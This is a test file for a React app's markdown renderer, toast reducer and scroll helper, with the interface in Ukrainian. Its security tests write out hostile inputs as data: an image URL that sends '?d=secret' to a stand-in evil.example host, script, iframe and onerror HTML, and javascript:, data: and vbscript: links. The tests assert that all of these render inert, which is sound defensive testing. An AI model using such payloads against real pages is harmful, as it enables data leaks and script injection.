import test from "node:test";
import assert from "node:assert/strict";
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";

import { ReportMarkdown } from "../components/v2/ReportMarkdown.tsx";
import { shouldScrollToFocus } from "../lib/v2/focus-scroll.ts";
import { isSelfDismissing, toastReducer, type V2Toast } from "../lib/v2/toast.ts";

/* ---------- the diagnostics report is rendered, never trusted ---------- */

const render = (text: string) => renderToStaticMarkup(createElement(ReportMarkdown, { text, tableClassName: "table-wrap" }));

test("a report renders headings, lists and GFM tables", () => {
  const html = render("## Головний діагноз\n\n- перше\n- друге\n\n| Місце | Проблема |\n| --- | --- |\n| абз. 2 | термін |\n");

  assert.match(html, /<h2>Головний діагноз<\/h2>/);
  assert.match(html, /<ul>\s*<li>перше<\/li>\s*<li>друге<\/li>\s*<\/ul>/);
  assert.match(html, /<div class="table-wrap"><table>/);
  assert.match(html, /<th>Місце<\/th>/);
  assert.match(html, /<td>абз\. 2<\/td>/);
});

test("images in a report are never rendered: no request can leave the browser because of model text", () => {
  const html = render(
    [
      "Текст до.",
      "![дані](https://evil.example/p.png?d=secret)",
      "![](https://evil.example/empty-alt.png)",
      "[![вкладене](https://evil.example/in-link.png)](https://evil.example/click)",
      "![за посиланням][ref]",
      "",
      "[ref]: https://evil.example/ref.png"
    ].join("\n\n")
  );

  assert.doesNotMatch(html, /<img/i);
  assert.doesNotMatch(html, /src=/i);
  assert.doesNotMatch(html, /evil\.example\/(p|empty-alt|in-link|ref)\.png/);
  // The alt text is kept as plain words, so nothing the model wrote silently disappears.
  assert.match(html, /дані/);
  assert.match(html, /вкладене/);
});

test("raw HTML in a report stays text: no element, handler or frame comes from it", () => {
  const html = render(
    'До <img src="https://evil.example/x.png" onerror="alert(1)"> після.\n\n<script>alert(1)</script>\n\n<iframe src="https://evil.example"></iframe>\n\n<a href="https://evil.example" onclick="x()">клік</a>'
  );

  assert.doesNotMatch(html, /<img/i);
  assert.doesNotMatch(html, /<script/i);
  assert.doesNotMatch(html, /<iframe/i);
  assert.doesNotMatch(html, /<a [^>]*onclick/i);
  assert.doesNotMatch(html, /<[a-z][^>]* onerror=/i);
  assert.match(html, /&lt;img src=&quot;/);
  assert.match(html, /&lt;script&gt;/);
});

test("only plain http(s) links are links, and they open without an opener", () => {
  const html = render(
    [
      "[добре](https://example.org/a)",
      "[скрипт](javascript:alert(1))",
      "[дані](data:text/html;base64,PHNjcmlwdD4=)",
      "[відносне](/api/auth/logout)",
      "[vb](vbscript:msgbox(1))",
      "<javascript:alert(2)>"
    ].join("\n\n")
  );

  assert.match(html, /<a href="https:\/\/example\.org\/a" target="_blank" rel="noopener noreferrer">добре<\/a>/);
  assert.equal((html.match(/<a /g) ?? []).length, 1, "exactly one anchor: the http(s) one");
  assert.doesNotMatch(html, /href="(javascript|data|vbscript):/i);
  assert.doesNotMatch(html, /href="\/api/);
  // The words of an inert link are still shown.
  assert.match(html, /скрипт/);
  assert.match(html, /відносне/);
});

/* ---------- the toast ---------- */

const error = (area?: V2Toast["area"]): V2Toast => ({ tone: "error", message: "Запит не виконано.", area });
const info = (area?: V2Toast["area"]): V2Toast => ({ tone: "info", message: "Готово.", area });

test("a new message always replaces the one on screen, an error included", () => {
  assert.deepEqual(toastReducer(error("fragment"), { type: "show", toast: info("fragment") }), info("fragment"));
  assert.deepEqual(toastReducer(error("fragment"), { type: "show", toast: info("accept") }), info("accept"));
  assert.deepEqual(toastReducer(null, { type: "show", toast: error("run") }), error("run"));
});

test("an error is taken down when the action it reported succeeds, and only then", () => {
  assert.equal(toastReducer(error("fragment"), { type: "resolved", area: "fragment" }), null);

  // Success somewhere else says nothing about this error.
  const stays = error("fragment");
  assert.equal(toastReducer(stays, { type: "resolved", area: "run" }), stays);

  // An error without an area is about nothing that can succeed later.
  const anonymous = error();
  assert.equal(toastReducer(anonymous, { type: "resolved", area: "fragment" }), anonymous);

  // A success message is not "resolved" away: it has its own timer.
  const note = info("fragment");
  assert.equal(toastReducer(note, { type: "resolved", area: "fragment" }), note);
  assert.equal(toastReducer(null, { type: "resolved", area: "fragment" }), null);
});

test("errors are sticky: the timer takes down only what is not an error", () => {
  const sticky = error("fragment");

  assert.equal(isSelfDismissing(sticky), false);
  assert.equal(toastReducer(sticky, { type: "expired" }), sticky);
  assert.equal(isSelfDismissing(info()), true);
  assert.equal(toastReducer(info(), { type: "expired" }), null);
  assert.equal(isSelfDismissing(null), false);
  assert.equal(toastReducer(sticky, { type: "dismissed" }), null);
});

/* ---------- scrolling to the focused suggestion ---------- */

test("the page scrolls to a suggestion when it becomes focused or the editor asks for it again", () => {
  assert.equal(shouldScrollToFocus(null, { focusId: "a", sequence: 0 }), true);
  assert.equal(shouldScrollToFocus({ focusId: "a", sequence: 1 }, { focusId: "b", sequence: 1 }), true, "focus moved on its own (the next card after a decision)");
  assert.equal(shouldScrollToFocus({ focusId: "a", sequence: 1 }, { focusId: "a", sequence: 2 }), true, "the same card asked for again (`До правки`)");
});

test("nothing else scrolls the page: a tab switch or any re-render leaves it where it is", () => {
  // The effect runs again with the same focus and the same sequence: that is all a tab switch looks like.
  assert.equal(shouldScrollToFocus({ focusId: "a", sequence: 3 }, { focusId: "a", sequence: 3 }), false);
  assert.equal(shouldScrollToFocus({ focusId: null, sequence: 3 }, { focusId: null, sequence: 4 }), false);
  assert.equal(shouldScrollToFocus({ focusId: "a", sequence: 3 }, { focusId: null, sequence: 3 }), false);
  assert.equal(shouldScrollToFocus(null, { focusId: null, sequence: 0 }), false);
});
